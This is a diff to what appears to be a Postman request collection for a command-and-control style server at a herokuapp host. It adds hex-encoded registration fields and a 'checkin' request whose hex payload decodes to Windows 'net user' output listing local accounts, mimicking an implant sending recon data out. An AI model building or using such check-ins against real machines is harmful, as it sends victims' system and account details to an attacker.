@@ -75,8 +75,24 @@
 				"method": "POST",
 				"header": [],
 				"body": {
-					"mode": "raw",
-					"raw": "{\n    \"guid\": \"abcd1235\",\n    \"computerName\": \"Win15\",\n    \"username\": \"User\",\n    \"ip\": \"192.255.68.03\",\n    \"mac\": \"AB:CD:EF:GG\"\n}",
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "guid",
+							"value": "37303037414343372D333230322D313144312D414144322D303038303546433132373054",
+							"type": "text"
+						},
+						{
+							"key": "username",
+							"value": "61646D696E",
+							"type": "text"
+						},
+						{
+							"key": "computerName",
+							"value": "4D61634F5331",
+							"type": "text"
+						}
+					],
 					"options": {
 						"raw": {
 							"language": "json"
@@ -99,18 +115,22 @@
 			"response": []
 		},
 		{
-			"name": "db-info",
+			"name": "checkin",
 			"request": {
-				"method": "GET",
-				"header": [
-					{
-						"key": "User-Agent",
-						"value": "ch0nky",
-						"type": "text"
-					}
-				],
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "hex",
+							"value": "0d0a55736572206163636f756e747320666f72205c5c57494e444556323130384556414c0d0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d0d0a41646d696e6973747261746f7220202020202020202020202044656661756c744163636f756e742020202020202020202020477565737420202020202020202020202020202020202020200d0a55736572202020202020202020202020202020202020202020574441475574696c6974794163636f756e74202020202020200d0a54686520636f6d6d616e6420636f6d706c65746564207375636365737366756c6c792e0d0a0d0a",
+							"type": "text"
+						}
+					]
+				},
 				"url": {
-					"raw": "https://ch0nkybear.herokuapp.com/",
+					"raw": "https://ch0nkybear.herokuapp.com/checkin/7007ACC7-3202-11D1-AAD2-00805FC1270T",
 					"protocol": "https",
 					"host": [
 						"ch0nkybear",
@@ -118,7 +138,8 @@
 						"com"
 					],
 					"path": [
-						""
+						"checkin",
+						"7007ACC7-3202-11D1-AAD2-00805FC1270T"
 					]
 				}
 			},
